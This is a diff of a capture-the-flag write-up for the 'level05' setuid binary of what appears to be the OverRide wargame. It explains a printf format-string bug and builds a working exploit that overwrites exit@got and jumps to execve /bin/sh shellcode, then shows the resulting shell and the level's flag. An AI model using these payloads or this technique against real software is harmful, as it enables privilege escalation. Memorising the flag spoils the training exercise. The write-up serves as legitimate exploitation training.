@@ -1,76 +1,159 @@
+# level05
 
-=> We have a fgets that fill a buffer at most 100 bytes
-=> The loop modify value of the buffer's values between "@" and "["
-=> Every values between 0x41 - 0x5a is modified by a XOR 0x20
-=> The buffer is then printed
+## General Informations 
 
+**Path** : `/home/users/level05/level05` </br>
+**File** : 
+```
+level05: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x1a9c02d3aeffff53ee0aa8c7730cbcb1ab34270e, not stripped
+```
+**Permissions**: `-rwsr-s---+ 1 level06 users 5176 Sep 10  2016 level05`  </br>
+**Protections**:
+```
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level05
+```
 
-=> Let's try to fill the buffer of "A"
-=> It doesn't touch the ret addr of main
-=> We can see that the buffer in printed with the printf function without the format protection
-=> Then we have string format exploit
+## Static Analysis
 
-=> We will try to overwrite the exit plt by an address pointing to an address in our buffer
-pointing to NOP slide and a shell code
+After decompiling the binary in ghidra, we get the pseudo code below: 
 
-0xffffd6d0:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd6e0:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd6f0:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd700:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd710:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd720:	0x61616161	0x61616161	0x00616161	0x00000063
+```
+void main(void)
+{
+  byte bVar1;
+  uint uVar2;
+  byte *pbVar3;
+  byte bVar4;
+  byte buffer [100];
+  uint i;
+  
+  bVar4 = 0;
+  i = 0;
+  fgets((char *)buffer,100,stdin);
+  do {
+    uVar2 = 0xffffffff;
+    pbVar3 = buffer;
+    do {
+      if (uVar2 == 0) break;
+      uVar2 = uVar2 - 1;
+      bVar1 = *pbVar3;
+      pbVar3 = pbVar3 + (uint)bVar4 * -2 + 1;
+    } while (bVar1 != 0);
+    if (~uVar2 - 1 <= i) {
+      printf((char *)buffer);
+                    /* WARNING: Subroutine does not return */
+      exit(0);
+    }
+    if (('@' < (char)buffer[i]) && ((char)buffer[i] < '[')) {
+      buffer[i] = buffer[i] ^ 0x20;
+    }
+    i = i + 1;
+  } while( true );
+}
+```
 
+`main`
+  - Stores the user input in a 100 bytes buffer using `fgets`, which is secure.
+  - Enters an infinite loop:
+    - For each character in the buffer: if it's between `@` and `[`, it gets XOR with 0x20 `(buffer[i] ^= 0x20)`.
+    - The buffer is then printed with `printf` as part of the exit condition.
 
-=> This is values of our stack filled by "A"
-=> Let's reserve some bytes for the format string and pick a value to point to
-=> We pick 0xffffd6e0
+The `printf` function uses user input (the buffer) directly as its format string, making the program vulnerable to a format string exploit.
+We can exploit this vulnerability to overwrite the entry of the `exit` function in the GOT, since the binary has no `RELRO` protection.
 
-=> We create the payload to overwrite exit@got.plt
+## Vulnerability found  
 
-=> Firstly we calcul the offset from an arbitrary address write at the start of our buffer
-r < <(python -c 'print "AAAA" + "%p "*15')
-aaaa0x64 0xf7fcfac0 (nil) (nil) (nil) (nil) 0xffffffff 0xffffd664 (nil) 0x61616161 <- Found
+The `printf` takes directly the user input (buffer) as argument, making it vulnerable to format string exploit. 
 
-=> Offset: 10
+## Dynamic Analysis
 
+To begin, we set breakpoints and determine the offset of our input:
+```
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) b *0x08048507
+(gdb) r < <(python -c 'print "AAAA" + " %p"*10')
+...
+(gdb) x 0xffffd5b8
+0xffffd5b8:	0x61616161
+...
+aaaa 0x64 0xf7fcfac0 (nil) (nil) (nil) (nil) 0xffffffff 0xffffd664 (nil) 0x61616161
+```
 
-=> After that we will slice the address in 2 and write the last 2 bytes with the h (short) format
-
+The offset is 10 and starts at `0xffffd5b8`.
+Now let’s overwrite the `exit` GOT entry with an address pointing to our shellcode stored in the buffer.
+```
+(gdb) x 0x80497e0
 0x80497e0 <exit@got.plt>:	0x08048376
+```
 
-ffff:				  65535
-d6ef:	55023 - 8 (2 addr) 	= 55015
-rest:	65535 - 55023		= 10512
+`0x80497e0` is the entry in the GOT for `exit`, we will overwrite this address by an address in the buffer pointing to a shellcode.
+```
+(gdb) x/40x $esp 
+...
+0xffffd5b0:	0xffffd664	0x00000000	0x61616161	0x61616161
+0xffffd5c0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd5d0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd5e0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd5f0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd600:	0x61616161	0x61616161	0x61616161	0x61616161
+0xffffd610:	0x61616161	0x61616161	0x00616161	0x00000063
+...
+(gdb) x 0xffffd5b8 + 50
+0xffffd5ea:	0x61616161
+```
 
-r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55015x" + "%10$n" + "%10512x" + "%11$hn" + "\xcc"*(62-28)')
+The GOT entry for `exit` is at `0x80497e0`. The buffer spans from `0xffffd5b8` to `0xffffd61c`, we'll target an address like `0xffffd5ea` in the middle of that range and overwrite `exit@got` with this value.
+
+Shellcode: `\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80` </br>
+
+We slice `0xffffd5c0` in two and calcul the number of characters to print for each part:
+- `0xd5ea = 54762`, where we substract the 2 the addresses,`54762 - 8 = 54754`
+- `0xffff = 65535`, the rest of the characters to print will be `65535 - 54762 = 10773`
+
+It gives us:
+```
+python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54754X" + "%10$hn" + "%10773X" + "%11$hn"'
+```
+
+Next, we add a NOP sled followed by the shellcode:
+```
+(gdb) r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54754X" + "%10$hn" + "%10773X" + "%11$hn" + "\x90"*(100 - (34 + 23)) + "\x31\xc9\xf7\xe1\xb0\x0b\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
+...
+f7fcfac0�process 2385 is executing new program: /bin/dash
+```
+
+It works ! 
 
 
-=> It works it's catch by the SIGTRAP
-=> Then we replace the \xcc by the NOP slide and the shell code
+## Payload construction 
+
+First write the address to overwrite, followed by the offset:
+```
+python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%10$hn" + "%11$hn"
+```
+
+Next we add a padding with the right number of characters to precisely control the written value (using format string specifiers `"%hn"`).
+```
+python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54754X" + "%10$hn" + "%10773X" + "%11$hn"
+```
+
+Finally, append the shellcode preceded by a NOP sled to increase the success rate:
+```
+python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54754X" + "%10$hn" + "%10773X" + "%11$hn" + "\x90"*(100 - (34 + 23)) + "\x31\xc9\xf7\xe1\xb0\x0b\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'
+```
 
 
-r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55015x" + "%10$n" + "%10512x" + "%11$hn" + "\x90"*(62-28) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
+## Demonstration 
 
-=> It doesn't work ! We have a segfault at 0xffffd77b
-Program received signal SIGSEGV, Segmentation fault.
-0xffffd77b in ?? ()
+```
+level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54754X" + "%10$hn" + "%10773X" + "%11$hn" + "\x90"*(100 - (34 + 23)) + "\x31\xc9\xf7\xe1\xb0\x0b\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'; cat) | ./level05
+f7fcfac0�whoami
+level06
+```
 
-=> Which is a address nowhere
-=> Let's check the stack
-0xffffd6ec:	0x90909090	0x90909090	0x90909090	0x31909090
-0xffffd6fc:	0x2f6870c0	0x6868732f	0x6e69622f	0xc189e389
-
-=> Look at the start of our shellcode 31 c0 70
-=> The 0x50 has been transformed to 0x70
-=> It's because we forget that every value [0x41 - 0x5a] are modified with XOR 0x20
-=> Let's replace this place with a different instruction
-
-0:  31 c0                   xor    eax,eax
-2:  50                      push   eax
-
-0:  31 c0                   xor    eax,eax
-2:  6a 00                   push   0x0
-
-=> We push 0x0 or eax (= 0 after xor) for the null terminated character to the stack
-
-r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55015x" + "%10$n" + "%10512x" + "%11$hn" + "\x90"*(62-28) + "\x31\xc0\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
+## Flag 
+```
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+```
